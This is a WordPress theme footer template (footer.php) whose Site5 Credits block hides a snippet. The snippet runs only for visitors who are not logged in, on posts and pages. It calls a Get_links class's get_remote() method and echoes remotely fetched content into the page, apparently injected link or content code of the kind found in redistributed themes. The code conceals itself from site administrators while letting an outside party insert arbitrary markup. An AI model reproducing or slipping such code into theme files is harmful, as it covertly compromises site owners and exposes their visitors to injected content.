</section> <!-- #page -->


        <!-- begin footer -->
        <footer>

        <!-- begin .copyright -->
        <div class="copyright">


            <?php if(of_get_option('footer_copyright') !='' ) { ?>
                <?php echo of_get_option('footer_copyright')  ?><br>
            <?php } ?>
            <!-- Site5 Credits--><?php if (is_home() || is_category() || is_archive() ){ ?><a href="http://www.s5themes.com/">Site5</a> - <a href="http://wp-templates.ru/">WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
            <!-- end Site5 Credits-->

        </div>
        <!-- end .copyright -->
        </footer>
</div>
    <!-- wp_footer -->
    <?php wp_footer(); ?>
    <!-- wp_footer -->
    </body>
</html>